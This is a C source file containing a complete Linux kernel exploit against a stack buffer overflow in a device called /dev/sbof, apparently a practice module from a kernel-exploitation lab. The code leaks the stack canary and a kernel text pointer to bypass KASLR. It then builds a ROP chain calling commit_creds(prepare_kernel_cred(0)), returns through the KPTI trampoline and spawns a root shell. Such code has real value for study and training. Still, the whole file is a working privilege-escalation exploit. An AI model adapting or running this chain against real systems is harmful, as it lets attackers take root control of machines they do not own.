#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>


/* For exploiting sbof */

#define DEVICE "/dev/sbof"
#define BUF_SIZE 15

#define VFS_READ_OFFSET 0x347240 

// used to store context
unsigned long user_cs = 0;
unsigned long user_ss = 0;
unsigned long user_sp = 0;
unsigned long user_rflags = 0;
unsigned long user_rip = 0;
unsigned long canary = 0;
unsigned long kernel_text = 0;
int fd = -1;

/* gadget offsets. Start as offsets. added to base to creat true addrs */
unsigned long pop_rdi_ret = 0x97140;
unsigned long prepare_kernel_cred = 0xd82d0;
unsigned long commit_creds = 0xd8020;
unsigned long kpti_trampoline = 0xe0100b;

// 0xffffffff81036814 : mov rdi, rax ; mov rax, rdi ; pop rbx ; pop rbp ; ret
unsigned long mov_rdi_rax_pop2_ret = 0x36814;

/* returns a value at index offset from the msg buffer in device_read 
 * canary is at index 3
 * vfs_read+161 is at index 7
 */
unsigned long leak_stack_offset(int fd, int index)
{
    // big buffer so we can leak fairly far. can be adjusted later
    unsigned long temp[0x30] = {0};
    if(index > 0x30-1)
    {
        printf("[-] Leaking too far, adjust size of buffer\n");
        return 0;
    }

    // if read fails return 0
    if(0 != read(fd, temp, (index + 1)*sizeof(unsigned long)))
    {
        return 0;
    }

    // otherwise return requested index
    return temp[index];
}


/* leak the canary and return it's value. Needs an open fd to the device */
unsigned long leak_canary(int fd)
{
    // using GDB we can see that 20 bytes gets us the canary at the end
    return leak_stack_offset(fd, 3);
}

unsigned long leak_vfs_read_ptr(int fd)
{
    // using GDB shows us that vfs_read+161 is at rsp[6]
    return leak_stack_offset(fd, 6);
}

// taken from https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/
void store_context()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax"
    );
}

void shell()
{
    system("/bin/sh");
}

/* Rop to call commit_creds(prepare_kernel_cred(0)), return to user mode, and
 * call shell()
 */
void exploit()
{
    unsigned long payload[0x20] = {0};
    int cur = 0;

    printf("[*] Attempting to escalate privs...\n");

    // adjust all gadgets with kernel_text
    pop_rdi_ret += kernel_text;
    prepare_kernel_cred += kernel_text;
    commit_creds += kernel_text;
    mov_rdi_rax_pop2_ret += kernel_text;
    kpti_trampoline += kernel_text;

    // gets executed when kpti_trampoline is called
    user_rip = (unsigned long) shell;

    // store context for use in chain
    store_context();

    // with canary in correct spot get to return address
    payload[cur++] = 0;
    payload[cur++] = 0;
    payload[cur++] = canary;
    payload[cur++] = 0; // 3 pops happen before ret
    payload[cur++] = 0; // 
    payload[cur++] = 0; //

    // first gadget pops 0 into rdi
    payload[cur++] = pop_rdi_ret;
    payload[cur++] = 0;

    // call prepare_kernel_cred
    payload[cur++] = prepare_kernel_cred;

    // get rax to rdi for commit_creds call
    payload[cur++] = mov_rdi_rax_pop2_ret;
    payload[cur++] = 0;
    payload[cur++] = 0;
    payload[cur++] = commit_creds;
    payload[cur++] = kpti_trampoline;

    // restore context
    payload[cur++] = 0; // rax
    payload[cur++] = 0; // rdi
    payload[cur++] = user_rip;
    payload[cur++] = user_cs;
    payload[cur++] = user_rflags;
    payload[cur++] = user_sp;
    payload[cur++] = user_ss;

    // go for gold
    write(fd, payload,  cur*sizeof(unsigned long));
}

int main(void)
{
    int code = 1;
    unsigned long vfs_read_ptr = 0;

    printf("[*] Opening %s\n", DEVICE);

    fd = open(DEVICE, O_RDWR);
    if(fd < 0)
    {
        perror("[-] Error opening " DEVICE);
        code = fd;
        goto RET;
    }

    canary = leak_canary(fd);
    if(0 == canary)
    {
        printf("[-] Must have canary to continue\n");
        goto CLOSE;
    }

    printf("[+] Leaked canary 0x%lx\n", canary);

    printf("[*] Leaking kernel address...\n");
    vfs_read_ptr = leak_vfs_read_ptr(fd);
    if(0 == vfs_read_ptr)
    {
        printf("[-] Failed leaking vfs_ptr+161\n");
        goto CLOSE; 
    }
    printf("[+] Leaked vfs_read+161 0x%lx\n", vfs_read_ptr);

    // subtract offset into vfs_read and offset of vfs_read from base
    kernel_text = vfs_read_ptr - 161 - VFS_READ_OFFSET;

    printf("[+] Leaked kernel .text segment address 0x%lx\n", kernel_text);

    printf("[*] Attempting to exploit...\n");
    exploit();

CLOSE:
    close(fd);
RET:
    return code;
}
